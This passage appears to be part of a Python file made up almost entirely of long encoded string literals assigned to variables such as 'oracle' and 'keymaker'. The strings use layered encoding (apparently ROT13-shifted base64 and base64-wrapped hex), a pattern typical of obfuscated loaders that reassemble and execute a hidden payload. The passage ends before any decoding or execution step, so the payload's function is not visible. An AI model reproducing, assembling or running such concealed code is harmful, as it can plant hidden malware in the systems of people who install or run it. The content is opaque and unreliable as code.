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'
oracle = 'Q1ODY4NjM0YjU0NTQ1MjU1NmYzNjU4NjU1MjdhNjk2MTMwNGY0Zjc3NjU1NTM0NmQ0ZDY0NzQzMzQ4Mzc2NTZiNGM1YTY4Mzc0ZDY0NmEzMTUwNDYzNDZlMmY1MTU2NGY1YTU5Njg1NDU1NzA2ZjQzNDg3OTUwNGU0MjcyNTM0NTY5NjMzODY0NzQ3NjdhMmI0NjZkNGY2ODU5NTU0Nzc4NmQ0ZTUxNmY1MjUwNmI1MDRmNjE2ZjY4NDkzNzQ1NTkzOTRhNjg3MDRlNjc0OTM3NTc2Mzc5NDg2YTc0Njk0ODc2NjQ2YjQzNTQzMjcwNmI3NTRmNTY2OTM5NDI1OTY1NTU3ODRiMzY2ODcxNTA1MTU5NTI3NTc3NTc0ZDY1N2E1MzUwMmY3OTY2NmEzOTY2NmE0OTY1NmYzNTRiNmQ1MTcxNzE3MTMwNDc3NjZiMmI0NTc0NmY1MzdhNzkzMjM4NDU2YjJmNjkzNzc1NTI2ODcyNzM2NjUyNmU2ZjZhNjE2MjZiMzg3YTY5NGQ3NDZmNzg3OTUwNGY2MTc2NzY1OTMxNTA1MzZlMmI1MjZmNmE2MzY1NGE3MDRhNmU3NzY1NGEzMjMwNDIzODcwNjY1MDRmNTMzNDU2NjU2YTQ2NTA0OTU5NmIzOTU5NDQ0ODc2NTQ3YTZkNGE1OTMyNTQ3NDQ0N2E1MjRlMmI2YzQxNTA0NDYxNzc2ODQ1MzU0MjJmNWE0ZjZkNGE1ODUyNmI1YTdhNzgzMjc1MzY2OTUyMzM2ZTU1Njg0YTU1MzI0ZjU0NTg2YzYzNGE2MzY0NTU2MTc4MzU0NjM4NTU2YTUxMzU2NjQ1NTM2YTJiNDI0OTYxMmI0YzUyNDkyYjZiNzYzMTQ1NDg2MzM4Mzk2ODUyNmE3MzczNzEzMDc2NjQ0OTY0Nzg0ZDRiN2E3NjY2Nzg0MTY1NmI1ODUwNDQzNzQ5NzkyZjQ1MzQ2ZTc2NWEzMjM3NTA0NjQ5NzM0ZjQxNzg3MDQ0NTg1MzU0MzQ1NTU3NTI0YTcyNjQ2YzY1NzQ2NjU1MzYyYjZiNTgzNTQ5NTczNTcwNDkyYjUxNjQ3MjY3MzM2ODcxNTA1MjJiNTA1MjZhNzkzNjZiNjc2NjRjNmY1Njc3NzQzOTY5NGQ2NTMzNmY3YTM1NDk2YzM5NzE1MTU2NmQ2NTc2NjU1OTUxNzA2NDRhNmQzOTQ4NTA0ZjczNTM2MzczNTY0ZjY3MzU3MDU0MzA0YzZlNmU0OTc4MzA0NDc0NGE1ODUwNDU3NTRjNjY3NTQ1NTA0NzU5MmI1NDM5NzQyZjQ4NmY0NDdhNmQ2Nzc1Nzc1NjZhMzE0ZTQ5NDIzMTQ0NmQ1MzQ0NmM3ODRjNTA0NjUwNTg3NzMwNmE0YzU3NzM3YTQ4Njc1MDM1MzA0NDc2MzE1MTc2NzE0NzRiMmY1MzUwNTE1OTM3NTQ2NTVhNTE3Njc0NGI1Mjc5NTA0MzM2MmIzODQyNjk0Nzc4MzA1NTM4NDY2OTRjMzk1NTQ2NmU2YTczNTI1NDcwNDIzMTY5NTQzMDQzNDEzMjQ5MzE1NzYyNzgzMjY3Mzg3NjczMzI0NTZhNjk0YTMwNmEzOTQ1MmI3NDQ0NGY1MDMyNGY2YTZlNzA0YjZlNTI0ZTZhN2E0ZjM1NmE0ODU0NWE3MTUyNGU2OTMzMmY2YzcwNGU2NTRkMzg2NTUwNzk2NTQ5NWEzMDRjNDQ2YzZkNGE1MjMyNTg3ODMyNDg2ZDM5MzM0NjMwNGEzODY0NDkzMTQzNTc1MDZiNTU2ODQ4NmY0NzM0NWE3NjM5NmM0YTM2NGM3NTZiNjg2NTU1NmE0ZTVhNzMzMDQ3NjQ0OTQzNmE1YTQ2NTM3ODMyNTA0NjZhNjQ0MjZhMzk2ZDRhNDg1NDJmNTE2YTc4MmY2ZjY5NGUzMjRmNWE0YjM2NjQ0ZjY4NTQ1YTQxNmQ2Zjc5NGQ3MzMzNWE0YTY5Nzk1NzRlNjg3MzY2MzY1MDQ3NTk1NTc2NWE0ZjRmMzE1MDRkNmY2NjM2NTQ0ODM3NjIyZjcwNjg0YjUzNTY3OTMzNDU1NzYyNGE0MjU1NTE3NTJiNmQ2NjdhNDg2NTQ3NTAzOTJiNTA0ZTRiNzc1MzUxMzA1MTZkNzI0ODY5NzM2NjRhNmI3MDRiNmQ1MTJmNmI1YTYxNGIzMzU2NDc0NzZmNTQ1MTRkNDQ2NzUwMzQ3NDMwNTQ2NTcyNjM2NTc5NzA0NjJiNjc3MTRhNTg2MTQ1NTU2MzZjMmY1NDZjNTQ0ZjZhNmE0NTZiMzk0MzM5Mzc2OTUxNzA3MzQ4NzgzNTRlNjk1NzY1NzM2MjM0NTE2NzRkNjY3MTU1NDEzODU4NmY1MzY2Mzg0ZTY4MmY3YTMzNjk2YTMzNjU2NzY2NGM2ZjJiNjg3NjMyNmMzMTYzNmY3ODQ3NmQzMjMyNDU0ODcyNjc2ZDc4NjU0ZDY5NzgzOTZhNmE0ZDYxMzA2MzZmNzg1NTZhNmU1YTU3MzA1OTYxNDc3NjM4NzU2OTYxNDY0NDMzNTM0MjU1NmU1NjZiNzU1MDU0NzE1NjQyNGY1ODRlNDk0MTRmNDE2MjU3NGU3NzY3NGUzOTVhNzQzNjU4NmU1MjQzNTgyYjU1Nzg0ZTQ3NmI0NjUxNmI3NjZkNzM1YTMwNjU1MjZjNmY2ZjM3NTM2Mjc5NTc0MzUwNjQ2NzZlMzU0ODU3Njg0Mjc4N2E3ODQ1NjE2YTRlNDEzMjM2NTIyYjc1MzA0ZDM5NDk1MzM2NDIzOTY4NTYzNjc3NDU2YTdhNTM0OTM1MzI0OTJmNzU0NTRiN2E2NDQ1NTU1NzZmNDQ2ZjZjMzM2ZjY3NDQ1YTM5MzIzNTJmNDU3MTM2NTE2ZDZiNmQ1NDQ5NGY3ODRlMzczOTYxNzE1MjZhNTY2Njc5MzczMDRkNzM1OTM3Mzk2YzM0NTQ0MzcwMzA0MzcwNjY0ODJiNTg3MzM1Njg3MDU2MzQ2MzZiMzg2YTcyNjY3ODQzNmQ2YjU1NzU3ODM4NDIzNzZmNjE2Njc5MmI0YTRjNDgzMTcxNTY2MzU0NWE0NDcyNDMzODUyNTg2ZjU2NmU3ODMyNTAzMjYyNDY2ZTRmNTIzNDM5NDU0ODYxNTkzMTQzNmIzMzU0MzE1MzQ1NzU3YTUwNGQ0NTRjNjk1NTM4MzU1YTZlNjE0NTZhNzM3MjZhN2EzNTQ3NTczOTU1NjYyYjMyNmY3ODMwNDk1NjJmNzc2ZTMzMzU0YTQ3NmU3MzMzMzA3NTU1NDU2NjMwNjg3ODM0NTA1NTQ0MzA3MjU5NTk3ODM2NTE3MDU3NTU0OTUwMzQzNzQ1MzMzNjU5MzczMDQ2Mzk3MDZjNDU0YzJiNmI3NjQ1NDk0YzQ1Nzg3NzZlNDI2ZDY2NDU3NjRjMzM3ODU0NTg2NDZlNTA3Mjc1NGY0ZTQ3NGY0ZDU0N2E3MTQyMzA0YzY3Mzk2NTM4NTEzNzc2NzA2NjQ5Mzk1OTZkNTI0ODcyMzI0ODQ4NmI2NTYzNDgyYjZjNDIzOTQ4NTczODRjMzk2NDQ3NTM0ZDY2Nzk3ODc1NzM2NDQ2NmQ2YjQ3NzA0ODUxNDk1NDU5NzI1ODRiNjI2NzJiNTg3MDYzNzgzNTU1NzE0NTUzMzE2ZjY1MmY1OTdhMzA2NzM0MzM1MTU3NzA0NzY2NGM3MTUxNDc0MzYyMzI1YTM5NDI0ZDM1NDY3NDY1NDk3NzMyNTM2YjY4NWE0NjJiMzYyZjQ5NTk1ODc2Nzg3OTc4NDg0ODUzNTY2NTU3NjE1MzQ0NmU2OTU3MzA1OTYzNDU1MjZmMzQ2YTJiNmM0Yzc1NjI1OTY5NGY0NTVhNGQ0NjMzNzIyYjY5NDM0ZDU4MzQ2ZjU0NTk3OTVhNTQ3MjRlN2E3YTQ3NmMyYjRlNmYzMDc1Mzk2OTMwNzE1MDc4NTA2NTY1NmU2ZTM1NGIzMjc3MzI0ZTdhNmE3MTZlNmM1NzRhMzAzMDQ0NzQ0YzMyNzQ2NTY5NDg0ZjRmMzY0ZTc0NDgzODM1NTI2OTYzMzk1NjZjNmI1MzJmMzM0Yzc0NTE2NjQzNjM2NTQ1NDE3MTZjNDM0ODc4NDM0ZTMwNGEzNzY3NzY2ZDMwMzk2NDRhNWE3OTRhNzQ1MzVhNmI2YTdhNTk0NTMwNDk2MTdhNTQ1NjY0MmIzMDQ4NzQ0YjY3NmQ0ZTJmNjg1MjMwNDk0NDVhNmM3ODQ5MmY0ZDQ4MzI0NzRkNjMzOTZhNjI2YTc1Nzk2ZTU1NjI3NTU2NjE3NzZjMzE2OTUyNjE3OTRlNmU2ZjU0NjU1MjdhNjk0YjMwNGM3NjcyN2E3OTUyNGIyZjQ3NjU1MDQxNDg0ZjczNmMyYjY4MzM3ODZhMzMzNDc0Mzk0MTY0NjIzNjQ5NmU0NTM2Nzc3NDc4NmU0ODUzNGM1NTc2NGI0YTMwNDk2Mzc2NTE3MzM4MzM0MjU5NjU2YzU4Njg0NzYxNzg0MjY5NjYzODQ2NGY3MDcyMmI1NDYxNTE1MzQ4MzA0YzJiNWE1MTZmNTM2ZTUzNmU3MjM1NjM1ODM1NmI0Yjc4NjY1NDM3NTA1OTZjNTg3OTYyMmY1NTc1Nzg3MjcyNGEzNjQ1NTg0NTM5Mzk0OTM5MzY1ODJmNjU1MzRlMzE2YTUwNTI2ZTZmNWE2ZDUzNTI2YjRkNjQ0ZDY3MmY3NzRmNDU3NDZmNDU0ZDU0NTQ1ODc2NDE3ODU5Mzc3ODY5NGM3MTQ4MmY0ZDRhMzQ1OTM1MzM0YjZjNjc1MDY4NGM0Nzc0NTU2NzM5Njk0ODM5MzAzNTU4NzI0YjczNTkzMzcyNjM0OTU5MzY3YTMyNjg1MzdhNGU3NTRjNjI2YjZkNzc0ZjczNDQ3MDRhNzU1MjU2NmU2MzUyNDc2NzZlMzE2MjZiNzAzOTZiNWE0ODRmMmI2YjMzNjI2Yjc5NzQ2OTQ5MzEzMTM0NGM2NTJiNzgzNzZkNDE2NDUyNzg3NzU1MmI3NjQ2NTk0NjJmNGM2MTZiNzQ2NzRhNzU3MjZiNzc0ODZiNmQ3YTM1NGM1NTUyMzU2ZDRmMzUzMTczNTEzODUxMzk2ZjUwMzY2NTRhNzk1ODU5NDMzMDM0NmE0NzJmNGQ3ODM5Mzc1MTZmNTc1MjM2Nzk3YTQ5NTczMDQ5NTQ2YzJiNzQ1ODcwNDQzMjU0NGU2YjU4Mzg0YjMwNmE3NjRlMzg2NTYzNjM0YzRjNmM1NzZiNmY2YzJmNzY0MzUxNjE3NzM5Mzg0NDczMzk0OTQ4NzI0ZTQ5NTYzNjUyNjY0Yjc0NGI3MTRhNzE3ODcyNjg0NDVhNDU0ZjZmMzk1MTQ2Njg2Yzc2Nzg0NDZlNTc2NTc5NTA0ZTUyNzU3Nzc4MmY3MDc1NGQ0ZjVhNzQ3ODUyNDY3ODY4NmU2ZDRlMzg2YjYyNjEzNTQ3NjY0ZDQ5NjE3OTc1NjgyYjVhNzc1OTUyNzk0ZTRlNWE3MTdhNDQ1NzQzMmI2NDUyN2E3MTUwMzA0ZjVhNmY1MjM5NGE0ZDU3NDkyYjU0NDE2ZDc0NDk1NDYyNTU2YzU0NzM2OTMxNmU2YjQ3NzUzNDM1NDM0Nzc4NTg2ZDRhMzEzNDRiMmYzMzY4NmE1ODcwNDY0Zjc4NmU3NDY3NGI2YTZiMzM2YjMyNzA3ODYzNjM1YTRkMzY2YTY2NTUzMjRkNTk2YTMwNTc0ZDc4NDg3NTZkMzM0YTc2NDM3MDU1NGE2OTMwMzE0MzRiMmI2Njc4NGI1MTQ2NDU3MDJmNDc2NTU1NmU1NDVhNDMzNzJmNmIzNzM2NmE3MDU2Mzc1NjcwNGYyZjRiMzk1MzM2MzU0NDZhNGM3MTU4NjU2YTU3NzA0YTczNTM1NjMwNjc2YTRhNjkzNjUyNTA2YjYyMmY0NjM1NzA2NTRjMzk2NTU0NTg0YjQ3NDIzMDM3MmI1YTMzMzYzNzZhMzk1OTUyNjk0OTc1NzU1ODc1NzM0MTYyMmI3NzU3NjgyZjM3NDgyYjU5NTIzNjZhNmUzNzQ3NTc1OTU0Nzg3NzQ4NGI0NTU2NDQ2YzRiNjY1ODYyNjg3NTMyNzYzODMwNTg3MTRkNTI1NzY4NDQzOTU3NGY2OTRiNmIzNTQ3NjU0NDZhNmU2NzcwMmY3MjQzNjM1NTY4NmU2Yjc1NzQ0ODY4NzQ0NDQ1NmQ1NzY0NmY2NjM5NjE0ZTZhNGE0NzRiNjU0NTY5NjM0YTcyMzI2MjYzNTM2NjU4MzU3MTVhMmY2NDM5MzE2ZTQ1NDQyZjZiMzk1NDQ3MzUzOTY5NGUzMDUxNDg3NTM4MzU2YjRmMzg0OTU3MzAzNTQ3NjU0ZjRkMzk1NzY4NDY1MDM1NDYzNjY4NzY1MjZjNTUzNjZhNGM2NzczNjU3Mzc0MzI0YzcxMzA1YTU0NzI1YTQ2NGM1ODZiNjUzNDZmNjQ2MTZlNmI0MzY0NGIzMjczNWEzNjUyN2E2OTZjMzAyZjUwNDU2MTY4NTY3OTY2NDUzOTc3NmMzMzVhNTgzMDcxNTczOTJmNmI1Mzc0NzI2ZDMyMmIzNzZjMzY1MzRhNTc1NjQ5MzM3NTcxNTQ3MjQzNzIzMzU4NmM2ZDczNzg0NjM2NDg3NDZkMmI1MDMxNmIzMzY5NmIzMjU3NGU2NTY5NTc0ZTY2MzY0ZDczNDQ3MjMyMzA0YTQ0NTU3YTZmMzg1YTRjNTA2OTQzNjU0NDMxNDU1MDc1MzY0NTJiNjEzOTVhNDQ1MTQzMzQ2ZTM3Nzg0NDJiMzUzNzZkNjE0ZjU2NGY0MzUzMzg1ODczNjg2MjcxMzM0ODY2Njc3MDdhNzkyZjU2NDY1NTM2NjgzNjcyNjgzNjc2MzkzNzQ4NTA1OTVhNzg0YzU4NzQ0YzUzNDI3NzZlMzk0YjcwNGQzNjY4NjYzMjU5NDk2NjY5NTI0YjY1NmU2YTY4NDg1OTM5MzA3NTY1NGE1NzUzNTA3NDU1NzEzNDY0MzA2ODM2NmI1Nzc2NGEzNjY3NGY1MzU2NGQ2MzM2MzMzMzZhNDQ1MzM3NTk3MTUyMzU3MzU4MzQzNDRjNTUzOTMxNDc2ZTUzNzQzMjUxNmUzMDcyNjczNjZmNjE1NzRiNzYzMzZhNjY3NDRjNmU1MzZjNzU3NTczNDc2NjRkNDczNjdhNmUzMjc2MzM3NTY4NDY1NTc1MmI3MjZmNTM3NTRjNTQ1MjM4MmI3NjY1MzM2ZTM0MzEzNDRjNDg2ODYyNmQ2OTUwNjQ3Njc4NmEzNzQ4NjM2OTM5NDg2ZTQ3NWEzMTc3NGI0OTMxMzk1YTM0NDg1ODUxMmY3ODcyNmUzODYyNjY1MTUwMzQ3MjcxNTc2ZDZlMmI2Yjc1NmQ0YjM4MzczMzM2NDc2NjY5NzIzNTYxNzg2OTc2NGY1NjQ1NGYzNjZiNjk1MDM5NDg0NDU3NmY0NDM3NzA3ODY1Nzg3YTMyNTE2NTU0NzY3MTc4Mzc3NTYyMzc3MTc5NzI1NjUwMzI3MDc2MzU2NDYzNGEzMTcyNjk1MTJmNzM0ZDM4Njk3YTU5Mzc1ODQyNGU2YTZlNGQ1NDJmNTI1ODcxNTQyZjQzNmUzMTMwNzY0NzM1MzY0OTYyMzI1MjMxMzg2OTYzNmI2NTYyNDc0NzRmNDc1NjY5MzA0Njc3Njk2NjZlNGM2YjZlMzU1MDYzNzAyZjJiNzA2ZDY1NGI1ODYyMmI3NjQxNzg0ZjQ4NTM2MzY1NTQ2NjZjMzkzNjUxNzE2ZDZlNjk0NDc1NzM2ODMzNmM2NDY3NTg2MjRiNTM0ZjY0NDg3NjYzNjg3MjY1NzA0OTc2Mzk2ZDUwMmI2YjRhNzE2NTJmNjk0YzU4NzA3MTdhNzg0ZjZjNmY3MzMxMzQzNTMxNGE2ZTUyNzA1MTM2MzQ1MDUzNTUzMTRhNjY1YTRhNGY0YjRlNjM2Yzc2NzEzODZjNmI1OTYyNGEyZjcwNTI3ODRlNmM0OTM0NzA1OTM0NTY2ZDZhNjk3Njc2NWE0NzU3NGE3YTU1MmY2MTU5NGE1MzQ2MzYzNzU5MzMzODcxMzQ2YjQ4Njc2NzQ4NTY3NDJmMzYzNjJiNTEzNjc5NjUzNTJiNDk0ZDdhNzk0MjU1NzYzOTc3NTQzOTc4NzIzMzUxNmM0MzJmNjkzMzM1NTI3YTQ3NDg0NzY2MmI0ZjJiNGUzMTMwMzA3MjM1NmM0ODUzNGMzNDU4NGY2MjYzNmQ1NjUwMzk2MjY4NDY3NjMxNTU3MjcwNzY1YTU1NzY2NDRiNjI2MzUwMzQ1OTc2Mzk1MzZkNGY0ZjMxMzE2NDQ2NTg1YTRlMzk0NjM5NmM1NzRiMzg1MzcyNjIzMjQyNjQ2MTM0MzM1NTUyMzE2YzJmNzM0NDMyNTIyZjU5Nzk3MjU4NTE3OTU1NjY2YjU0MzU1MDY1MzQ3OTM1NjYyYjc5NzI1MzVhNTA2NjZhNTA2ODQ0NDc3NTUwNmMzMjM2Mzg0NTU4Nzc3NjZkNzMzMTRjNzk3MzM5NTI2ZTMzNzI2NzY2NGE0ZTY2NWE3NTRhMmY2NzQzNjMzMTU5MzY2ZTU3MzU1NDczNzUyYjY2NTQyZjMyNzQzODUyMzAzMDczNDM0NjJmNmMzODRiNzY2NjdhMzc1NzY3NDg3NDU0NTQzMDUzMzkzODYxMzYzMzUyNTgyZjM2NTU2NjYxNzE2NDUzNzQzMTZhNjQ0ZjMyNjU1MDY2Njk3NjQ2NjE3Mzc2NTM1YTczNzMzOTY5Nzk2ZTM0NDY2MTYzNzg3OTZlNTU2ZTZmNzIzMDQ5Mzc0ODYxMzg2MjQ1NjgyYjQ1NTQ2NzZjMmYyZjU5NGQ2ZDdhNzQ3MDYxNzM1MzM4NmI2ZTVhNzMzMDMyNzY0NzYxNDk0ODQ2NjMzNjRlMzI0OTc3MmY0NjM2NjkyYjQzNzgzNTQ1NjY3NTQzMzA2YjY2NGIzOTY0NjkzNzVhNDc2ZDRiNjY3Mzc4NzA0NTMxNjIzMzJmNzQ0MzZiMzc0NzJmNTkzMzMyNzU1MzY0NjUzMDc2NzYzMTZhMmI2ZTMzNGU1NjRmNzA3MzcxNjIzOTQ4Nzk3MjRjNzgzMzUxNzY0OTc0NTU2ODY1NTQ3ODc5NzYzNTU1NjgzODZhNGU2NDU5Njg1MjYyNGIyZjUxNmE3MTM1NTk1ODU4NDM3NTY3MzM2YzY1NDM2ZDJiNGM2NjMwNzY2NTY1NzgyZjM2NTQzODdhNTA1MDM1NjU2MzU0NmU3NzY4NmE3MjQxNzU1OTZjNmY1YTZjNGM3NjcwNjQzOTQzNjE2ZTZlNTc0ODY2NTI0YzMxNmQ3NjMwNGIzNzZhNGU1ODM2NzA3OTc5Mzc2NjMyNDM2YzM1NmI2ZTQ4Njg2YTQ4NjE1MzJmNmY2NjMxNDc2NTZlNTQ3ODU4Njg0NjU3NzU3YTcyNmE0NDU0NzkzODY2NmY1MjM4Mzc3NTM5N'
keymaker = 'Qp3Awp0ATDmBGpkZmx1ZmHlZmN2LGZ5ATZ2LmL0ATV3BQp2ZmR0ZwZlAwH3ZmLlAmN0AmWvAwR2AwMwZmtlMwMwA2RmAGHjZmp0Mwp0Amx1BQZ0ZmxmAGL4AmLmZQZ1ATV2Zmp2AzR2LmH2AwL0LwD5AGD1AQL1AQZlMwL0AGVmBGp0ATR2Awp5AGt1AmMvAwp1BQZ3AQR2AQIuAwV2MQZlAGNlMwquAwHlLwpjAGV3Zwp1AwV0LmEyAGL1AmZ1AQV3ZmH0AmV3BQMzAmp2Zwp1AwH1BGZ0ZmN2MGLkAzZ3LGZ4Zmp2LwZlAmVmBGHkAwx0MGL2AwxmAGZkATZlMwWzAzL0AmHjAmp3BGL3AGtmZGWvZmRmBGZkAmt2AwLmAQVmAwD4AwDmZGH1AzR2ZwZ5AGH2MQWzZzL3AGHjAwR1LGH0AzRmZwZlZzV3LGplAGZ0AQL1AGp1ZQHmZzVlLwp2ZmH2AwplATR0ZmEyAwH3ZmMxZmL1ZGWzAwZ2Zwp4AwH2AmL4ZmNlLwExAwLlLwZlZzV2BQD4ZmD3ZmL1AGp1BQEvAmLmAmZ3AwD2AQL2Amx2MQEyAwL0BQLmAmV2LGDlZmZ2AQWvZmDlLwLlATV1ZQH3ATD2MGD0AwxmAmDmZmRlLwEzAwH3ZmIuZzV2ZwLmZmRmBGWzAwL2AwEzZmx0LGMzZmH1ZQL2AzD1AwDkAmV3ZGD5Amt2LGZ0ATD0LGZ5Zmx1LGquAzHmZmp2AQx2MGp5ATH2AwZ4AJR0AGD5AmV3BQD0AmL1AmZ5AQt0AQEuAGtmBQH3ZmpmZmD2AGN1ZQHmATV1ZQZlAQV0LwWvZmV0AQLmAwLmZQH5AzH3LGEvZmpmAQZmATH0MwLmAJR0BGp0ATL0LGp5AwD0MQH0AGt3AQZ5AGLlLwExAQt2LwMvAGR2LwHjATH3BQD5ZzV1BQHmZmHmAmZ5AmZ0LwMyAmH3LGplAzVmAwIuAQLmZmMxAmL0AGZ4AzL1ZmD4AGN0AGHjATHmAGL0ZzVmAwHlATLmZGH1